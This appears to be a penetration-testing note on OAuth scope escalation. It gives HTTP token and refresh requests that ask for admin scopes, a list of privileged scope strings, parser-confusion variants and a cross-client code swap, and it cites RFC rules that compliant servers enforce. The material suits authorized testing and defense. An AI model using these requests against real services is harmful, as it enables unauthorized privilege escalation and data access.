# OAuth — Scope Escalation

## When this applies

- App requests a minimal scope (e.g. `profile`) at authorization time, but the token endpoint or token-validation step does not enforce the granted scope.
- Goal: obtain a token with elevated scope than the user consented to.

## Technique

The `scope` parameter is sent at multiple points: authorization request, token request, refresh request, token introspection. If the server validates `scope` only at one step (e.g. authorization) but not at others (e.g. token or introspection), an attacker can request `admin` scope at the token endpoint after consenting to only `profile`.

## Steps

### 1. Authorization with minimal scope

```http
GET /auth?client_id=ID&redirect_uri=...&response_type=code&scope=profile HTTP/1.1
```

Victim consents to `profile` scope only.

### 2. Token request with elevated scope

```http
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=...&client_id=ID&client_secret=SECRET&scope=admin+delete_users+read_secrets
```

If the token endpoint honors the new `scope` (or doesn't validate it against the original), the returned token has elevated permissions.

### 3. Common scope strings to try

```
admin
admin:all
admin:read admin:write
delete_users
read_secrets
manage_users
internal
super_admin
*
```

### 4. Refresh-token scope expansion

```http
POST /token HTTP/1.1

grant_type=refresh_token&refresh_token=REFRESH_TOKEN&client_id=ID&scope=admin
```

Some providers allow refresh requests to broaden scope — should NOT be allowed per RFC 6749 §6 ("scope of the access request must not include any scope not originally granted").

### 5. Multi-scope consent confusion

When the authorization request lists multiple scopes:

```
scope=profile email
```

But the consent screen only displays one (UI bug):

```
"Allow access to your profile?"  →  user clicks Yes
```

The user grants both `profile` AND `email` despite consenting to only `profile`.

### 6. Whitespace / separator confusion

```
scope=profile%20admin            # space-separated
scope=profile,admin              # comma (some providers normalize)
scope=profile+admin              # plus (URL-encoded space)
scope=profile;admin              # semicolon
```

Test each separator — providers may parse differently in authorization vs token contexts.

### 7. Validate elevated scope

Use the obtained token against admin endpoints:

```http
GET /admin/users HTTP/1.1
Authorization: Bearer ESCALATED_TOKEN
```

Or introspect:

```http
POST /introspect HTTP/1.1
Authorization: Basic <client_creds>

token=ESCALATED_TOKEN
```

Response shows the granted scopes; if elevated scopes appear, escalation succeeded.

### 8. Token swap with another client

When the same OAuth provider serves multiple clients with different scopes:

1. Authenticate to a low-privilege client → receive code.
2. Exchange code at the high-privilege client's token endpoint (different `client_id` parameter).
3. If client_id verification is missing, the high-privilege client's token returns with elevated scopes.

## Verifying success

- Token introspection returns elevated scopes.
- Admin endpoints return 200 (vs 403 with original scope).
- Token's `scope` claim (if JWT) matches what was requested.

## Common pitfalls

- RFC-compliant providers REJECT scope expansion at the token endpoint — only legacy or buggy implementations are vulnerable.
- The user must have access to the elevated scope on the OAuth provider's side; you can't grant `admin` if the user isn't an admin.
- Some providers downgrade scope silently — the request "succeeds" with `admin` but the issued token only has `profile`. Always introspect to confirm.
- Refresh token scope expansion is a related issue but separately mitigated.
- For full administrative access, scope alone may not be sufficient — combine with token-binding bypass or audience confusion.

## Tools

- Burp Suite Repeater for systematic scope manipulation.
- OAuth introspection endpoint (`/introspect`) to inspect granted scopes.
- jwt.io for inspecting `scope` claim in JWT access tokens.
